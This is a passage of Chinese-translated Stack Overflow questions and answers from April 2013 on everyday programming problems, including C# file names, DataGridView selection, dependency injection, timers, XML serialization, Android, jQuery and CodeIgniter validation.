        public void onClick(View arg0) {
            Process p=null;
            try {
                p = new ProcessBuilder()
                .command("/sdcard/Script/scritturafile.sh")
                .start();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if(p!=null) p.destroy();
            }
        }
    });
}
} 
```

没有错误，但是当我按下按钮时，我认为外壳没有运行，所以不要创建 file.txt

# c# - 从 C# RESTful 服务获取查询字符串

> ID：15879454
> 
> 赞同：0
> 
> 时间：2013-04-08T12:47:50.360
> 
> 标签：c#, asp.net, wcf, rest

我使用一个`Global.asax`文件来公开我用 C# 实现的 Rest 服务。

```
RouteTable.Routes.Add(new ServiceRoute("MyServiceAPI", new WebServiceHostFactory(), typeof(MyServiceAPI))); 
```

我可以从此文件中访问查询字符串 ( `Request.queryString()`)

我的问题是如何将它从`Global.asax`.

非常感谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T12:21:29.193

如果您需要访问较低层中的查询字符串`System.Web.HttpContext.Current.Request.Url`通常会有所帮助。

# eclipse - 如何在eclipse中调试包使用冲突

> ID：15879455
> 
> 赞同：0
> 
> 时间：2013-04-08T12:47:52.437
> 
> 标签：eclipse, osgi

在 Eclipse rcp 应用程序中使用 cxf 时，您会收到如下错误：Package uses conflict: Import-Package: ...myservicepackage; 版本="5.3.0.SNAPSHOT"

在这种情况下，我的服务接口和类型使用了由系统包导出的注释和 cxf 的依赖项之一。因此，虽然我在这种情况下解决了它，但 Eclipse 中的错误报告非常糟糕。错误中显示的包不是错误的根源，而只是它出现的顶级包。

有没有办法让 eclipse rcp 或一般的 Equinox 在这里报告更多细节？因此，例如，查看哪些重复包存在冲突以及哪些包导出它们会有所帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T06:35:02.387

我发现以下链接对于解决一个此类实例很有用。你也可以试一试。

[http://blog.springsource.org/2008/11/22/diagnosing-osgi-uses-conflicts/](http://blog.springsource.org/2008/11/22/diagnosing-osgi-uses-conflicts/)

# c# - C#从字符串列表中删除文件扩展名

> ID：15879457
> 
> 赞同：4
> 
> 时间：2013-04-08T12:48:00.267
> 
> 标签：c#

我的程序所做的基本上是将目录中的文件名（包括它的扩展名）列出到列表框中。然后它有一个排序功能，将列表字符串按字母顺序排序。

最后，它有一个二进制搜索功能，允许用户输入任何字符串，然后程序将进行比较并将匹配的结果显示到列表框中。

现在，所有这些功能都可以完美运行，但是我似乎无法在搜索后删除文件名的扩展名。

例如在扫描和排序部分，它将文件名列为：filename.mp3

现在，当单击搜索按钮时，我希望它删除文件扩展名并仅显示文件名。

```
 private void buttonSearch_Click(object sender, RoutedEventArgs e)
    {

        listBox1.Items.Clear();

        string searchString = textBoxSearchPath.Text;

        int index = BinarySearch(list1, 0, list1.Count, searchString);

        for (int n = index; n < list1.Count; n++)
        {
            //Removes file extension from last decimal point ''not working''
            int i = list1[n].LastIndexOf(".");
            if (i > 0)
                list1[n].Substring(0, i);

            // Adds items to list
            if (list1[n].IndexOf(searchString, StringComparison.OrdinalIgnoreCase) != 0) break; 
            listBox1.Items.Add(list1[n]);
        }
        MessageBox.Show("Done");
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T12:51:14.847

C# 非常简单，如果某些事情需要超过 2 分钟，那么框架中[可能有一种方法。](http://msdn.microsoft.com/en-us/library/system.io.path.getfilenamewithoutextension.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-08T12:56:43.733

试试下面的 ite 会帮助你....

说明：[无扩展名的文件名](http://msdn.microsoft.com/en-us/library/system.io.path.getfilenamewithoutextension.aspx)

```
 listBox1.Items.Add(Path.GetFileNameWithoutExtension(list1[n])); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-08T12:49:49.863

该`Substring`方法返回字符串的新副本，从源副本复制。如果您想“切断扩展”，那么您必须获取 Substring 返回的内容并将其存储在某处，即：

```
int i = list1[n].LastIndexOf(".");
if (i > 0)
    list1[n] = list1[n].Substring(0, i); 
```

但是，这是删除扩展名的非常奇怪的方法。

首先，使用`Substring(0,idx)`很奇怪，因为有一个[`Remove(idx)`（链接）](http://msdn.microsoft.com/pl-pl/library/9ad138yc.aspx)可以做到这一点：

```
int i = list1[n].LastIndexOf(".");
if (i > 0)
    list1[n] = list1[n].Remove(i); 
```

但是，其次，还有更好的方法：`System.IO.Path`该类为您提供了一组编写良好的静态方法，例如，删除扩展名（编辑：这是 L-Three 在评论中建议的），完全处理点等：

```
var str = System.IO.Path.GetFileNameWithoutExtension("myfile.txt"); // == "myfile" 
```

请参阅[MSDN 链接](http://msdn.microsoft.com/en-us/library/system.io.path.getfilenamewithoutextension.aspx)

它仍然返回一个副本，您仍然必须将结果存储在某个地方！

```
list1[n] = Path.GetFileNameWithoutExtension( list1[n] ); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-08T12:55:35.450

采用[`Path.GetFileNameWithoutExtension`](http://msdn.microsoft.com/en-us/library/system.io.path.getfilenamewithoutextension%28v=vs.71%29.aspx)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-04-08T13:12:10.657

使用 Path.GetFileNameWithoutExtension 方法。我猜很容易。

[http://msdn.microsoft.com/en-us/library/system.io.path.getfilenamewithoutextension.aspx](http://msdn.microsoft.com/en-us/library/system.io.path.getfilenamewithoutextension.aspx)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-11-05T19:04:44.360

不确定您是如何实现目录搜索的，但您可以在这些情况下利用 LINQ 来获得干净、易于阅读的代码：

```
var files = Directory.EnumerateFiles(@"\\PathToFiles")
            .Select(f => Path.GetFileNameWithoutExtension(f)); 
```

如果您使用的是 .NET 4.0，Enumerate files 似乎是比 GetFiles 更好的选择。但是，听起来您也想同时获得完整的文件路径和不带扩展名的文件名。以下是创建字典的方法，以便消除两次循环遍历集合：

```
var files = Directory.EnumerateFiles(@"\\PathToFiles")
            .ToDictionary(f => f, n => Path.GetFileNameWithoutExtension(n)); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-09-30T00:38:24.957

如果您没有文件路径，只有文件名，可以这样做

```
string filePath = (@"D:/" + fileName);
string withoutExtension = Path.getFileNameWithoutExtension(filePath); 
```

# c# - 开头没有选中行的DataGridView

> ID：15879461
> 
> 赞同：20
> 
> 时间：2013-04-08T12:48:15.610
> 
> 标签：c#, .net, winforms, datagridview

在我的 WinForms 中，我有`DataGridView`. 我想一次选择整行，所以我设置`SelectionMode`为`FullRowSelect`. 现在我遇到了问题，因为在开始时我的表单在第一行下划线（选定的行集是空的，第一行没有被选择，但只是下划线）。我尝试了很多东西，例如：

```
 private void dataGridView1_DataBindingComplete(object sender, DataGridViewBindingCompleteEventArgs e)
    {
        dataGridView1.ClearSelection();
    } 
```

而且都失败了，因为实际上没有选择。

我怎样才能摆脱这个下划线？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2014-10-09T15:32:48.003

只需放入`dataGridView1.ClearSelection();`表单的加载事件。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-04-08T13:45:04.187

这对我有用：

```
private void dataGridView1_DataBindingComplete(object sender, DataGridViewBindingCompleteEventArgs e)
{
    dataGridView1.Rows[0].Selected = false;
} 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2013-04-10T13:12:29.020

不幸的是，这些答案都没有帮助我，但我找到了其他解决方案。而不是无法选择，我只会用这段代码隐藏它：

```
dataGridView1.DefaultCellStyle.SelectionBackColor = dataGridView1.DefaultCellStyle.BackColor;
dataGridView1.DefaultCellStyle.SelectionForeColor = dataGridView1.DefaultCellStyle.ForeColor; 
```

因此，如果有人只想隐藏选择，它会很好地工作。

干杯:)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-08-04T12:11:37.590

您应该尝试放入 Shown 事件`datagridView.ClearCelection()`，`datagridView.CurrentCell=null`例如，如果您想选择行来删除或更改信息，那么`if(datagridView.CurrentCell==null){ MessageBox.Show("You must select row");}`它对我有用

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-10-12T08:03:22.647

试试这可能会有所帮助

```
private void dgv_order_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
        {
            dgv_order.CurrentCell.Selected = false;
            dgv_order.ClearSelection();
        } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-09T04:07:43.097

尝试 `DataGridView.AllowUserToAddRows = false`在构造函数之后设置`InitializeComponent()`。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-04-01T10:21:01.057

您可以像这样在 form_Load 事件中调用 dataGridView.ClearSelection() 方法...

```
 private void Form1_Load(object sender, EventArgs e)
    {
     // You will get selectedCells count 1 here
     DataGridViewSelectedCellCollection selectedCells = dataGridView.SelectedCells;
     // Call clearSelection 
     dataGridView.ClearSelection();
     // Now You will get selectedCells count 0 here
     selectedCells = dataGridViewSchedule.SelectedCells;
    } 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-09-07T10:36:04.113

这项工作对我来说是为了明确选择数据绑定

```
Protected Sub GridCancel_DataBinding(sender As Object, e As EventArgs) Handles GridCancel.DataBinding
    GridCancel.SelectedIndex = -1

End Sub 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-09-22T08:53:55.713

在开始时为禁用的选定行设置的事件是这个，并管理一个 FLAG 以停止 ClearSelection

```
private void dataGridView_SelectionChanged(object sender, EventArgs e)
{

    if (FLAG==true)
    {
       dataGridView.ClearSelection();
       FLAG=false;
    }
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-12-29T10:42:58.367

有时，当您在不关闭程序的情况下重新加载表单时，第一行将突出显示。但它不会被选中，你会得到 -1 选定的行索引。

你可以这样做：

 1\. 表单加载时存储默认样式：

```
 Public Class aRoots
    Dim df1, df2, df3, df4 As Color
    Private Sub aRoots_Load(sender As Object, e As EventArgs) Handles Me.Load
            df1 = DGV_Root.DefaultCellStyle.SelectionBackColor
            df2 = DGV_Root.DefaultCellStyle.BackColor
            df3 = DGV_Root.DefaultCellStyle.SelectionForeColor
            df4 = DGV_Root.DefaultCellStyle.ForeColor 
```

 2.与datagridview交互时改变cell样式：

```
Private Sub LoadRoot()
       For i = 0 To 5
                DGV_Root.Rows.Add()
                For j = 0 To 3
                    DGV_Root.Item(j, i).Value = ...
                Next
            Next
        'DGV_Root.ClearSelection() ==> instead of this use 2 lines below
        DGV_Root.DefaultCellStyle.SelectionBackColor = df2
        DGV_Root.DefaultCellStyle.SelectionForeColor = df4
    End Sub 
```

 3\. 当像 cell_click 或 cell_double click 改变选择时，将单元格样式更改为默认值：

```
Private Sub DGV_Root_CellMouseClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DGV_Root.CellMouseClick
        DGV_Root.DefaultCellStyle.SelectionBackColor = df1
        DGV_Root.DefaultCellStyle.SelectionForeColor = df3

...
End Sub 
```

 4.当你想关闭表单时，全部恢复为默认值：

```
Private Sub PbClose_Click(sender As Object, e As EventArgs) Handles PbClose.Click
        BtnCancel.PerformClick()
        DGV_Root.DefaultCellStyle.SelectionBackColor = df1
        DGV_Root.DefaultCellStyle.BackColor = df2
        DGV_Root.DefaultCellStyle.SelectionForeColor = df3
        DGV_Root.DefaultCellStyle.ForeColor = df4
        Me.Close()
End Sub 
```

希望这对你们有帮助。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-04-26T15:48:17.377

如果这是因为它在初始加载时引发了不需要的 GridView1_SelectionChanged 事件，则可以使用标志来处理此问题

```
public partial class YourFormName
{ 
    private bool IsReady= false;

    private void YourFormName_Load(object sender, EventArgs e)
    { 
           //Load your GridView1...
           //Format your GridView1...
            IsReady = true;
    }
    void GridView1_SelectionChanged(object sender, EventArgs e)
    {
         if (!IsReady) 
             return;
         //do the rest of the stuffs
    }
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-02-06T00:27:54.027

**在第一次显示帧后运行的“显示”**事件对我有用：

```
private void frmMain_Shown(object sender, EventArgs e)
        {
            dataGridView1.ClearSelection();
        } 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-11-06T19:09:17.703

有同样的情况，“ `dataGridView.Shown`”事件是唯一对我来说像魔术一样的解决方案：

```
// Clears the default selection of both Data Grid Views
private void dataGridView_Shown(object sender, EventArgs e)
{
    dataGridView.ClearSelection();
} 
```

# c# - 依赖注入在“链”的下游

> ID：15879464
> 
> 赞同：0
> 
> 时间：2013-04-08T12:48:20.347
> 
> 标签：c#, java, unit-testing, design-patterns, dependency-injection

我一直在阅读有关如何编写可测试代码的内容，并偶然发现了依赖注入设计模式。

这种设计模式真的很容易理解，实际上没有什么，对象要求值而不是自己创建它们。

但是，现在我正在考虑如何使用我当前正在开发的应用程序，我意识到它有一些复杂性。想象以下示例：

```
public class A{

   public string getValue(){
      return "abc";
   }
}

public class B{
   private A a;

   public B(A a){
      this.a=a;
   }
   public void someMethod(){ 
      String str = a.getValue();
   }
} 
```

单元测试`someMethod ()`现在很容易，因为我可以创建 A 的模拟并`getValue()`返回我想要的任何东西。

类 B 对 A 的依赖是通过构造函数注入的，但这意味着 A 必须在类 B 之外实例化，因此该依赖已移至另一个类。这将重复许多层，并且在某些点上必须进行实例化。

现在的问题是，当使用依赖注入时，你是否会不断地通过所有这些层传递依赖关系？这不会降低代码的可读性和调试时间吗？当您到达“顶层”层时，您将如何对该类进行单元测试？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T18:12:14.890

我希望我能正确理解你的问题。

**注入依赖**

不，我们不会通过所有层传递依赖关系。我们只将它们传递给直接与它们对话的层。例如：

```
public class PaymentHandler {

    private customerRepository;

    public PaymentHandler(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }

    public void handlePayment(CustomerId customerId, Money amount) {
        Customer customer = customerRepository.findById(customerId);
        customer.charge(amount);
    }
}

public interface CustomerRepository {
    public Customer findById(CustomerId customerId);
}

public class DefaultCustomerRepository implements CustomerRepository {

    private Database database;    

    public CustomerRepository(Database database) {
        this.database = database;
    }

    public Customer findById(CustomerId customerId) {
        Result result = database.executeQuery(...);
        // do some logic here
        return customer;
    }
}

public interface Database {
    public Result executeQuery(Query query);
} 
```

`PaymentHandler`不知道`Database`，它只谈`CustomerRepository`。在存储库层注入`Database`停止。

**代码的可读性**

在没有框架或库帮助的情况下进行手动注入时，我们最终可能会得到包含许多样板代码的工厂类，例如`return new D(new C(new B(), new A());`在某些时候可能不太可读。为了解决这个问题，我们倾向于使用像**Guice**这样的 DI 框架来避免编写这么多工厂。

但是，对于实际执行工作/业务逻辑的类，它们应该更具可读性和可理解性，因为它们只与直接合作者交谈并完成他们需要做的工作。

**单元测试**

我假设“顶层”层是指`PaymentHandler`班级。在这个例子中，我们可以创建一个存根`CustomerRepository`类并让它返回一个`Customer`我们可以检查的对象，然后将存根传递给 stub 以`PaymentHandler`检查是否收取了正确的金额。

一般的想法是传入假合作者来控制他们的输出，这样我们就可以安全地断言被测类的行为（在这个例子中是`PaymentHandler`类）。

**为什么接口**

正如上面评论中提到的，依赖接口而不是具体类更可取，它们提供更好的可测试性（易于模拟/存根）和更容易调试。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-08T13:00:48.383

是的，这意味着您必须将依赖关系传递给所有层。然而，这就是控制反转容器派上用场的地方。它们允许您在系统中注册所有组件（类）。然后，您可以向 IoC 容器询问`class B`（在您的示例中）的实例，它会自动调用正确的构造函数，以便您自动创建构造函数所依赖的任何对象（在您的示例中`class A`）。

可以在这里找到一个很好的讨论：[为什么我需要一个 IoC 容器而不是简单的 DI 代码？](https://stackoverflow.com/questions/871405/why-do-i-need-an-ioc-container-as-opposed-to-straightforward-di-code)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T08:23:29.490

IMO，您的问题表明您了解这种模式。

正确使用，您将拥有一个[组合根](http://blog.ploeh.dk/2011/07/28/CompositionRoot/)，其中所有依赖项都被解析和注入。在这里使用 IoC 容器将解决依赖关系并为您将它们向下传递到各个层。

这与许多人认为是反模式的服务位置模式直接相反。

使用组合根不应降低您的代码的可读性/可理解性，因为具有清晰和相关依赖关系的精心设计的类应该是合理的自文档化。我不确定对组合根进行单元测试。它有一个谨慎的角色，所以它应该是可测试的。

# javascript - 插入 css 动画 Internet Explorer javascript

> ID：15879466
> 
> 赞同：1
> 
> 时间：2013-04-08T12:48:21.960
> 
> 标签：javascript, internet-explorer

我想在 Internet Explorer 中插入带有 javascript 的动画。似乎不起作用。用chrome，ff没问题。请查看以下链接：

```
var style = document.documentElement.appendChild(document.createElement("style")),

rule="@keyframes test{ 0%{opacity:1;} 50%{opacity:0;} 100%{opacity:1;}} ";
style.sheet.insertRule(rule);

$(".mojo")[0].style["animation"] = " test 3s ease-out both infinite"; 
```

[http://jsfiddle.net/273e2/17/](http://jsfiddle.net/273e2/17/)

动画是否适用于 IE10。在运行时插入动画似乎不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T21:08:14.200

该[`insertRule`](http://msdn.microsoft.com/en-us/library/ie/ff975163%28v=vs.85%29.aspx)方法需要两个值；第一个是新规则字符串，第二个是您希望将其添加到其他规则中的索引。

的索引`0`会将规则推到顶部，与规则总数相等的索引会将其推到规则的底部。

```
// Add a new rule to the bottom of the first stylesheet
sheet.insertRule( rule, sheet.rules.length ); 
```

将此索引添加到您的演示解决了这个问题：http: [//jsfiddle.net/273e2/19/show/](http://jsfiddle.net/273e2/19/show/)

# shell - Automator Service Shelll 脚本：使用第二个参数对所选文本进行排序

> ID：15879467
> 
> 赞同：0
> 
> 时间：2013-04-08T12:48:22.533
> 
> 标签：shell, automator

我想为以下转换（文本选择）创建一个**Automator 服务。**

*对第二个参数进行排序*

输入：

```
#define Type1 String(@"Type1", @"Other")
#define Type2 String(@"Type2", @"Britain")
#define Type3 String(@"Type3", @"America")
#define Type4 String(@"Type4", @"Canada") 
```

输出：

```
#define Type3 String(@"Type3", @"America")
#define Type2 String(@"Type2", @"Britain")
#define Type4 String(@"Type4", @"Canada")
#define Type1 String(@"Type1", @"Other") 
```

我知道我可以使用`sort | uniq`命令，但这将从左到右排序。但我想对第二个参数进行排序，如上所示。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:50:33.913

这应该有效：

```
sort -k 4 your_file 
```

其中`-k 4`表示第 4 列是要排序的列。

输出：

```
#define Type3 String(@"Type3", @"America")
#define Type2 String(@"Type2", @"Britain")
#define Type4 String(@"Type4", @"Canada")
#define Type1 String(@"Type1", @"Other") 
```

# android - 用于从音频文件生成波形的 Android 库

> ID：15879468
> 
> 赞同：2
> 
> 时间：2013-04-08T12:48:23.077
> 
> 标签：android, waveform, audio

我目前正在开发一个 android 应用程序，需要能够呈现音频文件的波形。我已经阅读了 Visualizer 类，但我认为该类旨在进行实时计算。我想要做的是通过音频文件并生成例如包含整个音频文件波形的.PNG。

基本上像soundcloud这样的东西：http: [//www.djban.com.br/wp-content/uploads/soundcloud-waveform.png](http://www.djban.com.br/wp-content/uploads/soundcloud-waveform.png)

有没有图书馆可以做到这一点？或者你能告诉我如何获得音频文件的振幅数组吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:27:32.563

我不知道任何图书馆，但应该很容易让它工作。

首先，为了获得波形的振幅，您需要[PCM](http://en.wikipedia.org/wiki/Pulse-code_modulation)格式的音频。假设您需要任意音频文件（尤其是 mp3）的波形，您将需要找到一种在格式之间进行转换的方法。一个快速的谷歌搜索给出了[这个结果](https://stackoverflow.com/questions/12437804/convert-mp3-to-pcm-in-java)。注意：如果您只需要对来自麦克风的音频执行此操作，则可以避免转换，因为它以 PCM 格式提供音频数据。

获得样本后，您需要以某种方式绘制它们的幅度。你有几个选择，但我会试试[Canvas 。](http://developer.android.com/reference/android/graphics/Canvas.html)您可以在那里绘制线条（或一般形状），然后[将其导出到文件](https://stackoverflow.com/questions/2174875/android-canvas-to-jpg)或在屏幕上绘制。

绘制的另一个选项是 OpenGL。如果您以前没有使用过它，这会更复杂，但它可能会更快。

# c# - 无法创建 xml 文件

> ID：15879469
> 
> 赞同：1
> 
> 时间：2013-04-08T12:48:24.593
> 
> 标签：c#, xml, serialization

我正在尝试使用从测试中获取的信息创建一个 xml 文档。基本上我是`{get; set:}`用来获取信息的，当我浏览程序时，你会看到文件信息在哪里传递，但我要么得到无法创建 xml 文档的错误，要么它已创建但为空白。

这是代码：

```
public class XmlCreate
    {
        public string Types { set; get; }
        public DateTime Time { get; set; }
        public bool done{ get; set; }

        public void SerializetoXml(IRepo repo)
        {       
            var filename = string.Format("{0}__{1}", DateTime.Now.ToString("yyyyMMdd"), "Log.xml");
            var path =
                @"C:\TestDocs\artifacts";
            if (!Directory.Exists(path))
                Directory.CreateDirectory(path);
            var fullpath = Path.Combine(filename, path);
            var serializer = new XmlSerializer((typeof(IRepo))); 
            var textwriter = new StreamWriter(filename);
            serializer.Serialize(textwriter, repo);
            textwriter.Close();
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T15:04:48.830

XML 序列化程序需要提前知道它将遇到的所有对象类型。如果您仍在尝试使用接口而不是类类型创建序列化程序，那么这可能是问题的一部分；接口不一定会公开对象的所有公共属性。否则，您需要确保包含 XML 序列化程序无法从您的属性自动推断的任何类型（例如，由于多态性）。使用根对象上的 XmlInclude 属性来通知序列化程序这些类型。例子：

```
// XmlInclude is necessary because our class doesn't explicitly mention derived object
[XmlInclude(typeof(ObjectDerived))]
class MyRootClass {
    public ObjectBase { get; set; }
}
class ObjectBase {
    // some properties here
}
class ObjectDerived : ObjectBase {
    // more properties here
}
...
var serializer = new XmlSerializer(typeof(MyRootClass)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:11:57.233

使用完整路径作为

```
Path.Combine(path, filename) 
```

不是相反。你的路径名原来是错误的

**编辑：**

您不能通过传递接口对象来序列化。[您可以按照此链接](http://geekswithblogs.net/SoftwareDoneRight/archive/2008/01/16/how-to-serialize-an-interface-using-the-xmlserializer.aspx) 或[此](http://ventspace.wordpress.com/2010/02/20/how-to-serialize-interfaces-in-net/)链接中提供的方式修改您的代码

# javascript - jQuery基本功能测试调用不起作用？

> ID：15879470
> 
> 赞同：1
> 
> 时间：2013-04-08T12:48:25.770
> 
> 标签：javascript, jquery, internet-explorer, jsp

我的 Jsp 是，

```
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%-- <%@include file="include.jsp"%> --%>

<%@ taglib prefix="form" uri="../tld/spring-form.tld"%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>

<script type="text/javascript" src="../jquery/jquery-1.9.1.js"></script>
<script type="text/javascript" src="../jquery/jqueryChat.js"></script>

</head>
<body>

    <input type="text" id="test" name="test" />
    <input type="button" value="Ajax Submit" onclick="madeAjaxCall()">
</body>
</html> 
```

我的 JqueryChat.js 将是.,

```
function madeAjaxCall(){
    alert("Hello 99");
    alert($("#test").val());
} 
```

当我单击按钮时，我收到错误消息，

![在此处输入图像描述](https://i.stack.imgur.com/vkKxc.png)

我需要获取警报中文本框的值。

好的答案绝对值得赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:05:08.377

以下代码非常适合我。

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>

$(document).ready(function() {
    $("#button").click(function(){
        alert("Hello 99");
        alert($("#test").val());
    });
});

</script>

</head>
<body>

    <input type="text" id="test" name="test" />
    <input type="button" id="button" value="Ajax Submit">
</body>
</html> 
```

1.  检查您的 jquery.js 和 jqueryChat.js 是否从适当的位置下载。
2.  把你的 JS 代码放进去`$(document).ready(function() { .. });`
3.  使用`$("#button").click(function(){`代替

> onclick="madeAjaxCall()"

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:04:31.177

嗨，您需要在此处使用单击事件之前调用 jquery 对象 onload。作为 $(document).ready()。所以只有 ist

# c# - 创建后台计时器以异步运行

> ID：15879476
> 
> 赞同：26
> 
> 时间：2013-04-08T12:48:37.223
> 
> 标签：c#, winforms, asynchronous, timer

我真的很挣扎。我正在`winforms`Visual Studio 中创建一个应用程序，并且需要一个每半小时计时一次的后台计时器 - 这样做的目的是从服务器上拉下更新。

我尝试了几种不同的方法，但都失败了，要么是由于教程/示例不佳，要么是我自己在`C#`. 我认为向您展示我迄今为止所做的尝试是浪费时间，因为我所尝试的似乎离目标很远。

有谁知道实现一个`C#`新手容易理解的异步后台计时器的清晰简单的方法？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2013-04-08T12:54:18.800

```
 // Create a 30 min timer 
    timer = new System.Timers.Timer(1800000);

    // Hook up the Elapsed event for the timer.
    timer.Elapsed += OnTimedEvent;

    timer.Enabled = true;

...

private static void OnTimedEvent(object source, ElapsedEventArgs e)
{
    // do stuff
} 
```

通常需要注意的是：计时器不会非常准确，可能需要`GC.KeepAlive(timer)`

另请参阅：[为什么 System.Timers.Timer 能在 GC 中存活，但 System.Threading.Timer 不能？](https://stackoverflow.com/questions/4962172/why-does-a-system-timers-timer-survive-gc-but-not-system-threading-timer)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-04-08T12:59:47.823

在表单中声明成员变量：

```
System.Timers.Timer theTimer; 
```

在表单加载时（或您需要开始更新轮询的任何其他时间），请执行以下操作：

```
theTimer = new System.Timers.Timer(1800000);
theTimer.Elapsed += PollUpdates;
theTimer.Start(); 
```

像这样声明 PollUpdates 成员函数：

```
private void PollUpdates(object sender, EventArgs e)
{
} 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-04-08T12:54:33.067

我认为您需要了解所有计时器类。请参阅下面乔恩的回答。

> 你用的是什么定时器？
> 
> 1.  System.Windows.Forms.Timer 将在 UI 线程中执行
> 2.  System.Timers.Timer 在线程池线程中执行，除非您指定 SynchronizingObject
> 3.  System.Threading.Timer 在线程池线程中执行其回调
> 
> 在所有情况下，计时器本身都是异步的——它在触发之前不会“占用”线程。

资料来源：[.NET 计时器是否异步运行？](https://stackoverflow.com/a/729165/3546415)

# ldap - 尝试使用 JXplorer 导入 LDAP（ldif 文件）时收到错误

> ID：15879478
> 
> 赞同：1
> 
> 时间：2013-04-08T12:48:43.847
> 
> 标签：ldap, novell, edirectory

我想在我的 LDAP 中导入一个 ldif 文件，所以我有这个错误

> javax.naming.directory.SchemaViolationException：[LDAP：错误代码 65 - NDS 错误：没有此类 (-604)]；剩下的名字 'o=test'

谢谢;

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T00:33:24.100

eDirectory 错误 -604 表示您指定的 objectClass 可能有错字。（601 是找不到对象，所以 DN 是错误的。609 是 Missing Mandatory。613 是语法违规）。

我建议您显示您正在使用的 LDIF 文件，以便我们可以尝试找出您正在发生的事情。

# macos - GateKeeper 警报在少数系统上显示

> ID：15879481
> 
> 赞同：1
> 
> 时间：2013-04-08T12:48:58.613
> 
> 标签：macos, osx-gatekeeper

我有一个使用 xcode 构建并使用“IceBerg”包制造商打包的应用程序。制作包后，我使用`codesign`命令对应用程序进行代码签名。所以我不会收到“未识别的开发人员”消息。

最近，我们的一位客户抱怨即使将 Gatekeeper 选项设置为“映射 App Store 和已识别的开发者”，也会收到“未识别的开发者”消息。它仅在此客户端系统中发生。

可能是什么原因？你有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-07T07:32:32.493

您应该使用“productsign”来签署您的包裹。请参阅[Gatekeeper 未发布说明](http://s.sudre.free.fr/Stuff/Installer/Unreleased_Notes/10.8_Gatekeeper.html)

# android - Activity重启后保持android table view的滚动位置

> ID：15879484
> 
> 赞同：1
> 
> 时间：2013-04-08T12:49:05.820
> 
> 标签：android, android-view, android-tablelayout, android-scrollview, android-scroll

我有一项活动，其中包含表格视图。我在每一行中动态生成一个带有切换按钮的表格。现在，当用户点击此按钮以将其切换到整个表格时，应该会刷新，以便如果用户希望该按钮再次关闭，那么它应该在再次点击时关闭。为此，我在完成一项活动后回忆起它，但它的滚动位置又回到了第一行。我希望滚动位置与点击切换按钮之前相似。谢谢你。

# codeigniter - 有没有办法在 jQuery 和 CodeIgniter 中混合验证

> ID：15879487
> 
> 赞同：0
> 
> 时间：2013-04-08T12:49:25.100
> 
> 标签：codeigniter, jquery-validate, validation

如果我们想同时包含 jQuery Validation 插件和代码点火器 form_validation 类，我们必须在 jQuery 验证脚本和 CodeIgniter form_validation 中定义验证规则。有没有办法在一个电话中混合两者。就像，我只想在 jQuery 或 CodeIgniter 中定义一次验证规则

jQuery：[http](http://docs.jquery.com/Plugins/Validation)
://docs.jquery.com/Plugins/Validation CodeIgniter [http://codeigniter.com/user_guide/libraries/form_validation.html](http://codeigniter.com/user_guide/libraries/form_validation.html)

现在处理：

```
//jQuery
$("#username").validate({
 debug: true
}) 
```

代码点火器：

```
//Code igniter
$this->form_validation->set_rules('username', 'Username', 'callback_username_check'); 
```

1）在您的控制器中加载库。

```
$this->load->library('jquery_validation'); 
```

2）设置CodeIgniter标准验证规则（与form_validtion库相同的规则格式）。

```
$rules = array(
            array(
                 'field'   => 'username',
                 'label'   => 'Username',
                 'rules'   => 'required|min_length[2]'
              ),
           array(
                 'field'   => 'email',
                 'label'   => 'Email',
                 'rules'   => 'required|valid_email'
              ),
           array(
                 'field'   => 'url',
                 'label'   => 'URL',
                 'rules'   => 'required'
              )
       ); 
```

3) 设置错误信息。

```
$messages = array(
             'username'  => array( 'required'    => "Username is required",
